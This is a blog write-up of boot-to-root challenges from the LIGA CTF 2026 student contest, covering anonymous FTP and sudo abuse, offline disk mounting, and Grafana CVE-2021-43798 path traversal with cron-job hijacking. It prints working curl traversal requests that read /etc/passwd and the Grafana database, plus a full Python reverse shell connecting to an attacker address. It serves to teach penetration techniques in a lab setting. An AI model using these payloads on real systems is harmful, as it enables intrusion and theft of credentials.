---
title: "LIGA CTF 2026 (Week 2) – Boot-to-Root"
date: 2026-06-01T10:00:00+08:00
draft: false
summary: "CTF Write-Up for all Boot-to-Root challenges that were solved during Week 2 of Liga CTF 2026."
tags: ["LIGA CTF 2026", "CTF Write-Up", "Cybersecurity"]
cover: banner.webp
series: ["LIGA CTF 2026 (Student) Write-Up"]
series_order: 2
---

## Introduction 👋

[**LIGA CTF 2026**](https://appsecmy.com/pages/liga-ctf-2026) is a six-weekend, category-focused Capture The Flag (CTF) competition running from May to July 2026 organised by [**OWASP Malaysia Federation (Kuala Lumpur Chapter**)](https://appsecmy.com/). Each weekend focuses on a specific cybersecurity discipline, allowing participants to spend more time exploring a particular domain instead of handling multiple categories simultaneously.

I participated in this competition in [**Student Category**](https://ligactfstudent.appsecmy.com/) together with two other teammates. This write‑up covers the challenges I solved during **Week 2** of the competition and will serve as a personal reference for future practice.

**Week 2** focused on **Boot-to-Root**, running from **29 May 2026, 08:00 PM** until **31 May 2026, 11:59 PM**. During this phase, I successfully solved 6 challenges.

> [!NOTE]+ 📢 Note
> I am still fairly new to writing formal CTF write‑ups, so I am actively working to improve my style and clarity. If you spot any mistakes or have suggestions, feel free to reach out.

---

## ⚔️ Logon Test

![logon-test](img/logon-test.png "```Logon Test``` Challenge Description")   

### 🗂️ Challenge Details

{{< tabs >}}
{{< tab label="📝 Challenge Description" >}}
**Category: Free Point**

**Challenge: Logon Test**

This is to verify if you have successfully log in.

The flag format for this CTF can be one of the followings:
- liga{xxx}
- OWASPKL{xxx}
- ligactf{xxx}

Each challenge description will explicitly mention which flag format to use.

Submit OWASPKL{FR33_FL4G} to earn free point of this challenge.

{{< /tab >}}

{{< tab label="🚩 Flag" >}}
```OWASPKL{FR33_FL4G}```
{{< /tab >}}
{{< /tabs >}}

---

## ⚔️ CHALLENGE 1 -- GGEZAF

![GGEZAF](img/GGEZAF.png "`GGEZAF` Challenge Description")  

### 🗂️ Challenge Details

{{< tabs >}}
{{< tab label="📝 Challenge Description" >}}
**Category: B2R - Easy**

**Challenge: GGEZAF**

Its 2nd Week already, you can even predict your position isnt? Well then, prove you're not tryhard.

This is dockerized challenge. Use target IP below. IP: 45.32.121.222

GLHF!
{{< /tab >}}

{{< tab label="🎯 Goals" >}}
- Scan all 65535 ports to discover the FTP (21) and SSH (22) services hidden from a quick top‑1000 scan.
- Exploit anonymous FTP access to retrieve the creds.txt file containing plaintext credentials.
- Use the recovered username and password to gain SSH access to the container.
- Enumerate sudo privileges and abuse the password‑less ability to run cat and ls as root to read the flag from `/root`.
{{< /tab >}}

{{< tab label="🚩 Flag" >}}
```OWASPKL{H3re's_th3_G1v3aW4y_500_p0int5_f0r_yA}```
{{< /tab >}}
{{< /tabs >}}

### 1️⃣ Reconnaissance   

The challenge title hints at something trivial ("GG EZ AF"). Our goal is to gain initial access to the Docker container and escalate privileges to read the flag in `/root`.  

We begin with a standard Nmap scan of the top 1000 TCP ports, but all appear filtered.  

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
nmap -sV -sC -T4 45.32.121.222
``` 

Since the host is up (low latency), we run a full 65535-port SYN scan:  

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
sudo nmap -p- -sS -T4 --min-rate=1000 45.32.121.222
``` 

This reveals two open ports:   

```{lineNos=false hl_lines=[3,5,8] filename=Text}
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

No web server, no exotic services – just FTP and SSH. The “easy” path likely lies in one of these.

### 2️⃣ FTP – Anonymous Login & Credential Discovery   

We connect to the FTP server and try anonymous authentication.   

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
ftp 45.32.121.222
Name: anonymous
Password: anonymous
230 Login successful.
``` 

The directory listing shows a single file:
```{lineNos=false hl_lines=[3,5,8] filename=Text}
-rw-r--r--    1 ftp      ftp            19 May 29 13:06 creds.txt
``` 

We download it:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
get creds.txt
bye
``` 

The file contains credentials:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
$ cat creds.txt
user1337:notsoleet
``` 

### 3️⃣ Initial Access via SSH  

Using the recovered credentials, we SSH into the target:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
ssh user1337@45.32.121.222
# password: notsoleet
``` 

We land in a minimal Ubuntu 26.04 container as user1337. Our home directory contains an `info.txt`:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
$ cat ~/info.txt
privesc to root to get flag. TY
``` 

So we need to escalate to `root`.

### 4️⃣ Privilege Escalation – Sudo Misconfiguration

Basic enumeration reveals the vector immediately:   

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
$ sudo -l
User user1337 may run the following commands on docker-chall-1:
    (ALL) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```  

We can run `cat` and `ls` as root without a password.

We first list `/root`: 

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
$ sudo ls /root
root.txt
```  

Then read the flag file:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
$ sudo cat /root/root.txt
OWASPKL{H3re's_th3_G1v3aW4y_500_p0int5_f0r_yA}
```  

This give us the flag for this challenge which is `OWASPKL{H3re's_th3_G1v3aW4y_500_p0int5_f0r_yA}`.

### ✅ Challenge Conclusion     

This challenge demonstrates how seemingly low‑risk services can become entry points when misconfigured. Anonymous FTP allowed anyone to download plaintext credentials, and overly permissive sudo rules (`cat` and `ls` with no password) turned a low‑privileged shell into instant root access. In real‑world environments, FTP servers must require authentication and never store sensitive files in publicly accessible directories, while sudo permissions should always be scoped to specific commands with fixed arguments to prevent easy privilege escalation.

---

## ⚔️ CHALLENGE 2 -- Spray and Pray Series (Easy)

![Spray and Pray - I](img/Spray-and-Pray1.png "`Spray and Pray - I` Challenge Description")
![Spray and Pray - II](img/Spray-and-Pray2.png "`Spray and Pray - II` Challenge Description")
![Spray and Pray - III](img/Spray-and-Pray3.png "`Spray and Pray - III` Challenge Description")  

### 🗂️ Challenge Details

{{< tabs >}}
{{< tab label="📝 Challenge Description" >}}
**Category: Spray and Pray Series (Easy)**

---

**Challenge: Spray and Pray - I**

Hi abel,

I seem to have forgotten my password. I wrote it somewhere under a "rock". You think you can help me reconnect to my PC?

Thanks.

Challenge file link: [https://drive.google.com/drive/folders/18iZq6EE3OkZxeLHfVZjFLKPh4PkMtpnT?usp=sharing](https://drive.google.com/drive/folders/18iZq6EE3OkZxeLHfVZjFLKPh4PkMtpnT?usp=sharing)

If the above link does'nt work, use the following instead: [https://drive.google.com/drive/folders/1HozgPMDCUzrv_1nhyStLG9IVdlKZSMHu?usp=sharing](https://drive.google.com/drive/folders/18iZq6EE3OkZxeLHfVZjFLKPh4PkMtpnT?usp=sharing)

Flag format: `OWASPKL{xxx}`

---

**Challenge: Spray and Pray - II**

Pivot to another user.

---

**Challenge: Spray and Pray - III**

Get root.

{{< /tab >}}

{{< tab label="🎯 Goals" >}}
- Import the provided OVF/VDMK and ISO into VirtualBox.
- Boot the VM with the Lubuntu live ISO (“Try Lubuntu”).
- Mount the virtual hard disk to inspect its contents.
- Find the password hidden “under a rock” (rockyou.txt) and use it to reconnect as abel.
- Retrieve the user flag from `abel’s` desktop.
- Pivot to user `niki` and capture the second flag.
- Escalate to `root` and read the final flag from `/root/proof.txt`.
{{< /tab >}}

{{< tab label="🚩 Flag" >}}
Spray and Pray - I: `OWASPKL{a2377c9ddd1837b32c82f4774a53e7a3}`  
Spray and Pray - II: `OWASPKL{d73aa3d24c1fb6ce993a38efe5505369}`  
Spray and Pray - III: `OWASPKL{05400e69198b6036bc1c05302435648e}`   
{{< /tab >}}
{{< /tabs >}}

### 1️⃣ VM Setup & Live Boot   

![CH2-1](img/CH2-1.png "**Figure 2.1:** Setiing Up the Given File in Virtual Box")

The challenge provides a virtual machine disk (`.vmdk`) and a Lubuntu live ISO (`.iso`). We import the appliance into VirtualBox:
- `File → Import Appliance` → select `machine01-spray.ovf`. Keep default settings.
- Attach the ISO: right‑click the VM → `Settings` → `Storage` → select the empty optical drive → `Choose a disk file` → `machine01-spray-file1.iso`.
- Start the VM. When the Lubuntu boot menu appears, choose **"Try Lubuntu"** (not "Install Lubuntu").

After the desktop loads, open a terminal.

### 2️⃣ Mounting the Virtual Hard Disk  

The live system does not automatically mount the target disk. We identify and mount it:  

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
lsblk                            # list block devices
sudo mkdir -p /mnt/disk
sudo mount /dev/sda1 /mnt/disk   # /dev/sda1 contains the root filesystem
```  

Now the entire file system of the target VM is accessible under `/mnt/disk`.

### 3️⃣ Following the “Rock” Clue

The description says the password was written somewhere “under a rock”. This hints at the famous rockyou.txt wordlist. We search for it:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
sudo find /mnt/disk -name "*rock*" 2>/dev/null
```  

![CH2-2](img/CH2-2.png "**Figure 2.2:** `rockyou.txt` were found")

The output shows `/mnt/disk/root/rockyou/rockyou.txt` – the complete wordlist is present as shown in **Figure 2.2**.

To find the exact password, we look for any command history. A clipboard history file (`qlipper.ini`) contains interesting entries:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
sudo grep -r "rockyou" /mnt/disk 2>/dev/null
``` 

![CH2-3](img/CH2-3.png "**Figure 2.3:** `sed -n '6767p' rockyou.txt` Output")

As shown in **Figure 2.3**, among the output we see lines like:

```{lineNos=false hl_lines=[3,5,8] filename=Text}
sed -n '6767p' rockyou.txt
``` 

This suggests the password is line **6767** of `rockyou.txt`. Extract it:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
sudo sed -n '6767p' /mnt/disk/root/rockyou/rockyou.txt
``` 

![CH2-4](img/CH2-4.png "**Figure 2.4:** Password for user `abel`")

As shown in **Figure 2.4**, the result is `bitch12`. This is the password for user `abel`.

### 4️⃣ Spray and Pray - I: Reconnecting as Abel

We could now boot the VM without the ISO and log in as abel with password bitch12, but the flag is directly readable from the mounted disk. Check `abel` desktop:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
sudo ls -la /mnt/disk/home/abel/Desktop/
sudo cat /mnt/disk/home/abel/Desktop/local1.txt
```

![CH2-5](img/CH2-5.png "**Figure 2.5:** Flag for **Spray and Pray - I**")

As shown in **Figure 2.5**, the output is `OWASPKL{a2377c9ddd1837b32c82f4774a53e7a3}`. This is the flag for **Spray and Pray - I**.

### 5️⃣ Spray and Pray - II: Pivoting to Another User

The second challenge asks to **"pivot to another user"**. The disk contains another user niki. Check `niki` desktop:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
sudo ls -la /mnt/disk/home/abel/Desktop/
sudo cat /mnt/disk/home/abel/Desktop/local1.txt
```

![CH2-6](img/CH2-6.png "**Figure 2.6:** Flag for **Spray and Pray - II**")

As shown in **Figure 2.6**, the output is `OWASPKL{d73aa3d24c1fb6ce993a38efe5505369}`. This is the flag for **Spray and Pray - II**.

### 6️⃣ Spray and Pray - III: Getting Root

The final goal is to read the root flag. The root user's home directory contains `proof.txt`:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
sudo ls -la /mnt/disk/root/
sudo cat /mnt/disk/root/proof.txt
```

![CH2-7](img/CH2-7.png "**Figure 2.7:** Flag for **Spray and Pray - III**")

As shown in **Figure 2.7**, the output is `OWASPKL{05400e69198b6036bc1c05302435648e}`. This is the flag for **Spray and Pray - III**.

### ✅ Challenge Conclusion

The "Spray and Pray" series demonstrates that a simple clue ("under a rock") can lead directly to a password when a famous wordlist is present. By booting the VM with a live ISO, we bypassed any authentication and mounted the target disk to read flags from user desktops and the root directory. This technique is common in Boot‑to‑Root (B2R) challenges: always check for world‑readable files, especially `rockyou.txt`, and inspect clipboard histories or command logs. The three flags were obtained without ever needing to crack hashes or exploit complex vulnerabilities, just careful filesystem exploration.   

---

## ⚔️ CHALLENGE 3 -- Routine Series (Medium)

![Routine - I](img/Routine-1.png "`Routine - I` Challenge Description")
![Routine - II](img/Routine-2.png "`Routine - II` Challenge Description")

### 🗂️ Challenge Details

{{< tabs >}}
{{< tab label="📝 Challenge Description" >}}
**Routine Series (Medium)**

---

**Challenge: Routine - I**

This box is vulnerable, and uses a mysql plugin.

Challenge file link: https://drive.google.com/drive/folders/12qTEcsKci_xycM1tJJcPqkOb0wsOOxRg?usp=drive_link

If the above link doesn't work, use the following link: https://drive.google.com/drive/folders/1_oXQtqq4mkJXBgPaTUOfXNFOWWkl5kdf?usp=sharing

Flag format: `OWASPKL{xxx}`

---

**Challenge: Routine - II**

Once you have a foothold, get root.

{{< /tab >}}

{{< tab label="🎯 Goals" >}}
- Set up the VM with a Host‑only network to interact with Kali.
- Perform network enumeration to discover open ports (SSH and Grafana).
- Identify Grafana v8.3.0 and exploit path traversal (CVE‑2021‑43798) to read the Grafana SQLite database.
- Extract plaintext credentials from the `credentials` table.
- Use the credentials to SSH into the machine as `tellytubby`.
- Obtain the user flag (`local.txt`).
- Identify a cron job running a writable Python script as root.
- Replace the script with a reverse shell payload to get root.
- Read the root flag (`proof.txt`) from `/root`.
{{< /tab >}}

{{< tab label="🚩 Flag" >}}
Routine - I: `OWASPKL{496d5373e7501c9aab3b2658bbad4c02}`  
Routine - II: `OWASPKL{b0f8c51049b9db31552bda1bd751940a}`  
{{< /tab >}}
{{< /tabs >}}

### 1️⃣ Virtual Machine Setup

The challenge provides an OVF package (`routine.ovf`) along with a disk image and an ISO. We import the appliance into VirtualBox:
- File → Import Appliance → select `routine.ovf`. Keep all default settings.
- After import, open the VM settings and go to Network. Ensure the adapter is attached to a Host‑only Adapter (e.g., `VirtualBox Host-Only Ethernet Adapter`). The default host‑only network in VirtualBox uses the subnet `192.168.56.1/24`, with the host typically at `192.168.56.1`.

![CH3-1](img/CH3-1.png "**Figure 3.1:** Console Displays when Starting the VM")

When we start the VM, the console displays as shown in **Figure 3.1**.

The target machine is now reachable from our Kali Linux VM (also attached to the same host‑only network).   

### 2️⃣ Initial Reconnaissance

![CH3-2](img/CH3-2.png "**Figure 3.2:** Full Port Scan of IP Address `192.168.56.102`")

From Kali, we perform a full port scan:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
sudo nmap -p- -sS -T4 192.168.56.102
```

The scan reveals two open ports:

```{lineNos=false hl_lines=[3,5,8] filename=Text}
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  http
```

A service version scan gives more details:  

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
nmap -sV -sC -p22,3000 192.168.56.102
```  

![CH3-3](img/CH3-3.png "**Figure 3.3:** Grafana v8.3.0")

As shown in **Figure 3.3**, Port 3000 is identified as Grafana. To confirm the version, we open a browser and visit `http://192.168.56.102:3000`. The login page footer or source code reveals `Grafana v8.3.0`.

This version is vulnerable to [**CVE‑2021‑43798**](https://github.com/jas502n/Grafana-CVE-2021-43798), an unauthenticated path traversal that allows reading arbitrary files.

### 3️⃣ Exploiting Grafana Path Traversal

Using the public exploit pattern, we first confirm file read by retrieving `/etc/passwd`:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
curl --path-as-is 'http://192.168.56.102:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
```  

```{lineNos=false hl_lines=[3,5,8] filename=Text}
┌──(darlene㉿kali)-[~/Desktop/Routine I and II]
└─$ curl --path-as-is 'http://192.168.56.102:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:996:996:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
messagebus:x:995:995:System Message Bus:/nonexistent:/usr/sbin/nologin
syslog:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:989:989:systemd Resolver:/:/usr/sbin/nologin
_chrony:x:988:988:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
tss:x:987:987:tss user for tpm2:/:/usr/sbin/nologin
uuidd:x:101:104::/run/uuidd:/usr/sbin/nologin
whoopsie:x:102:108::/nonexistent:/bin/false
dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
avahi:x:103:109:Avahi mDNS daemon:/run/avahi-daemon:/usr/sbin/nologin
nm-openvpn:x:985:985:NetworkManager OpenVPN:/var/lib/openvpn/chroot:/usr/sbin/nologin
tcpdump:x:984:984:tcpdump:/nonexistent:/usr/sbin/nologin
speech-dispatcher:x:104:29:Speech Dispatcher:/run/speech-dispatcher:/bin/false
usbmux:x:105:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
cups-pk-helper:x:106:110:user for cups-pk-helper service:/nonexistent:/usr/sbin/nologin
fwupd-refresh:x:983:983:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sddm:x:107:111:Simple Desktop Display Manager:/var/lib/sddm:/bin/false
saned:x:108:112::/var/lib/saned:/usr/sbin/nologin
cups-browsed:x:109:110::/nonexistent:/usr/sbin/nologin
pipewire:x:982:982:system user for pipewire:/nonexistent:/usr/sbin/nologin
hplip:x:110:7:HPLIP system user:/run/hplip:/bin/false
polkitd:x:981:981:User for polkitd:/:/usr/sbin/nologin
rtkit:x:980:980:RealtimeKit:/proc:/usr/sbin/nologin
colord:x:979:979:colord colour management daemon:/var/lib/colord:/usr/sbin/nologin
routine:x:1000:1000:routine:/home/routine:/bin/bash
yunacat:x:1001:1001::/home/yunacat:/bin/bash
kdjebat:x:1002:1002::/home/kdjebat:/bin/bash
tellytubby:x:1003:1003::/home/tellytubby:/bin/bash
ratusrempah:x:1004:1004::/home/ratusrempah:/bin/bash
sshd:x:977:65534:sshd user:/run/sshd:/usr/sbin/nologin
``` 

The command returns the contents of `/etc/passwd`, revealing several user accounts:

```{lineNos=false hl_lines=[3,5,8] filename=Text}
routine:x:1000:1000:routine:/home/routine:/bin/bash
yunacat:x:1001:1001::/home/yunacat:/bin/bash
kdjebat:x:1002:1002::/home/kdjebat:/bin/bash
tellytubby:x:1003:1003::/home/tellytubby:/bin/bash
ratusrempah:x:1004:1004::/home/ratusrempah:/bin/bash
...
``` 

We also read the Grafana configuration file:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
curl --path-as-is 'http://192.168.56.102:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'
```  

The command returns the contents of `grafana.ini`, revealing Grafana configuration.

```{lineNos=false hl_lines=[3,5,8] filename=Text}
#################################### Database ############################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url property.

# Either "mysql", "postgres" or "sqlite3", it's your choice
type = sqlite3
host = 127.0.0.1:3306
name = grafana
user = root
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
password =
# Use either URL or the previous fields to configure the database
# Example: mysql://user:secret@host:port/database
url =

# Max idle conn setting default is 2
max_idle_conn = 2

# Max conn setting default is 0 (mean not set)
max_open_conn =

# Connection Max Lifetime default is 14400 (means 14400 seconds or 4 hours)
conn_max_lifetime = 14400

# Set to true to log the sql calls and execution times.
log_queries =

# For "postgres", use either "disable", "require" or "verify-full"
# For "mysql", use either "true", "false", or "skip-verify".
ssl_mode = disable

# Database drivers may support different transaction isolation levels.
# Currently, only "mysql" driver supports isolation levels.
# If the value is empty - driver's default isolation level is applied.
# For "mysql" use "READ-UNCOMMITTED", "READ-COMMITTED", "REPEATABLE-READ" or "SERIALIZABLE".
isolation_level =

ca_cert_path =
client_key_path =
client_cert_path =
server_cert_name =

# For "sqlite3" only, path relative to data_path setting
path = grafana.db

# For "sqlite3" only. cache mode setting used for connecting to the database
cache_mode = private
``` 
From `[database]` section, we know that Grafana stores its configuration and data in a SQLite database file (`grafana.db`) at `/var/lib/grafana/grafana.db`. We download it:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
curl --path-as-is 'http://192.168.56.102:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' --output grafana.db
``` 

Now we examine the `grafana.db` database using anykind SQLite Viewer.

![CH3-4](img/CH3-4.png "**Figure 3.4:** `credentials` table inside `grafana.db`")

Among the tables, we find a non‑standard table named `credentials` as shown in **Figure 3.4**. The table contains plaintext credentials for several users.

| id | username    | password              |
|:---|:------------|:---------------------:|
| 1  | yunacat     | destiny4lyfe          |
| 2  | kdjebat     | Overw4tch1sgoated     |
| 3  | tellytubby  | V4lor4nt-Anti-cHEAT   |
| 4  | ratusrempah | password123@          |

These credentials were likely stored by a custom plugin or script – hence the challenge hint "uses a mysql plugin" (though the actual storage is SQLite, the credentials were planted).   

### 4️⃣ Gaining SSH Access   

![CH3-5](img/CH3-5.png "**Figure 3.5:** SSH Login with `tellytubby` Credentials")

With the recovered credentials, we attempt SSH login for each user. The password for `tellytubby` works:  

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
ssh tellytubby@192.168.56.102
# password: V4lor4nt-Anti-cHEAT
``` 

We are granted a shell

### 5️⃣ Routine - I: Capturing the User Flag  

![CH3-6](img/CH3-6.png "**Figure 3.6:** Flag for **Routine - I**")

Inside the tellytubby home directory, we find a file named `local.txt` containing the flag for **Routine - I** which is `OWASPKL{496d5373e7501c9aab3b2658bbad4c02}`.  

### 6️⃣ Privilege Escalation Enumeration  

![CH3-7](img/CH3-7.png "**Figure 3.7:** Privilege Escalation Enumeration")

After gaining a foothold as `tellytubby`, our goal is to become root. One of the first places to check for privilege escalation vectors is **scheduled tasks** (cron jobs). These often run with elevated privileges and may execute scripts or binaries that we can influence.    

Inside the `tellytubby` home directory, we list the system‑wide crontab:   

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
cat /etc/crontab
```

The output:
```{lineNos=false hl_lines=[3,5,8] filename=Text}
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
```

The output shows the standard system cron entries, but we notice a custom line at the bottom (not shown in the truncated output above, but we discovered later by checking `/etc/cron.d/`). Actually, the initial `cat /etc/crontab` didn't reveal the backup script because it was defined in a separate file. We need to check all cron locations:
 
```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
ls -la /etc/cron.d/
cat /etc/cron.d/backup
```

This reveals:
```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
*/1 * * * * root /opt/backup.sh
```

So every minute, `root` executes `/opt/backup.sh`. This is a prime target.

We examine the script:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
tellytubby@routine:~$ cat /opt/backup.sh
```

This reveals:

```{lineNos=false hl_lines=[3,5,8] filename=Text}
#!/bin/bash
# System Backup Script
# Runs daily to backup user data

echo "[*] Starting backup process..."
echo "[*] Backing up /home directories..."
tar -czf /tmp/home_backup.tar.gz /home/ 2>/dev/null
echo "[*] Running user backup module..."
python3 /home/tellytubby/Downloads/userbackup.py
echo "[*] Backup complete."
```

The script does a few things, but the critical line is `python3 /home/tellytubby/Downloads/userbackup.py`.

It runs a Python script located in tellytubby’s Downloads directory as root (because the cron job runs as root).

We check the permissions of that Python script:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
ls -la /home/tellytubby/Downloads/userbackup.py
```

This reveal `-rwxrwxr-x 1 root tellytubby 286 May 31 01:51 /home/tellytubby/Downloads/userbackup.py`. The file is owned by root but writable by the group `tellytubby` (and tellytubby is a member of that group). This means we can modify its contents. Since the cron job executes it as root every minute, we can replace the script with a reverse shell and gain a root shell.

### 7️⃣ Routine - II: Getting Root

![CH3-8](img/CH3-8.png "**Figure 3.8:** Flag for **Routine - II**")

We open up a new terminal and set up a netcat listener on our Kali machine:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
nc -lvnp 4444
```

Then, as `tellytubby`, we overwrite `userbackup.py` with a Python reverse shell:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
cat > /home/tellytubby/Downloads/userbackup.py << 'EOF'
#!/usr/bin/env python3
import os, socket, subprocess, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.103", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
EOF
```

Within 60 seconds, the cron job triggers and executes our payload. The netcat listener receives a connection as root:  

```{lineNos=false hl_lines=[3,5,8] filename=Text}
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.102] 53624
root@routine:~#
```

As shown in **Figure 3.8**, We now have a root shell. We can then locate the root flag:

```bash {lineNos=false hl_lines=[3,5,8] filename=Bash}
ls -la /root
cat /root/proof.txt
```

We find a file named `proof.txt` containing the flag for **Routine - II** which is `OWASPKL{b0f8c51049b9db31552bda1bd751940a}`.   

### ✅ Challenge Conclusion

The Routine series demonstrates several key CTF techniques:
- **Virtual networking** – using a host‑only adapter to isolate the target and attacker machines.
- **Service fingerprinting** – identifying a vulnerable Grafana version.
- **Path traversal** – reading the Grafana SQLite database containing plaintext credentials.
- **Credential reuse** – using the recovered passwords to gain SSH access.
- **Cron job hijacking** – replacing a writable script that runs periodically as root.

Even though the challenge description mentioned a "mysql plugin", the actual credential storage was a SQLite table created by a custom plugin. The privilege escalation vector turned out to be a simple cron‑based script takeover. This teaches us to always enumerate scheduled tasks and check for writable scripts or binaries executed by root. In real‑world pentests, such misconfigurations are common and can lead to full system compromise.